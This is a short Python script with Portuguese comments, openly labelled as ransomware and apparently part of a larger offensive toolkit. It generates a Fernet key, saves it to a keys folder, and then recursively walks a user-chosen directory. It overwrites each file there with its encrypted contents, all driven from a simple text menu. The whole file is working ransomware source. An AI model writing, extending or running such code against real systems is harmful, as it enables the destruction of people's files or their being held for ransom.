import os
from cryptography.fernet import Fernet
import sys
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from utils.banner import banner

# Gerar chave de criptografia
def generate_key():
    key = Fernet.generate_key()
    key_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "keys", "encryption.key")
    with open(key_path, "wb") as key_file:
        key_file.write(key)

# Carregar chave de criptografia
def load_key():
    key_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "keys", "encryption.key")
    return open(key_path, "rb").read()

# Criptografar arquivos
def encrypt_files(directory):
    key = load_key()
    fernet = Fernet(key)

    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, "rb") as target_file:
                    data = target_file.read()
                encrypted_data = fernet.encrypt(data)
                with open(file_path, "wb") as target_file:
                    target_file.write(encrypted_data)
                print(f"[+] Arquivo criptografado: {file_path}")
            except Exception as e:
                print(f"[!] Erro ao criptografar {file_path}: {e}")

# Menu principal
def menu():
    banner()
    print("""
  R A N S O M W A R E
==========================
1. Gerar chave
2. Criptografar arquivos
3. Sair
    """)
    choice = input("Escolha uma opção: ")
    if choice == "1":
        generate_key()
        print("[+] Chave gerada e salva em 'keys/encryption.key'")
    elif choice == "2":
        directory = input("Digite o caminho do diretório para criptografar: ")
        encrypt_files(directory)
    elif choice == "3":
        exit()
    else:
        print("[!] Opção inválida!")

if __name__ == "__main__":
    menu()
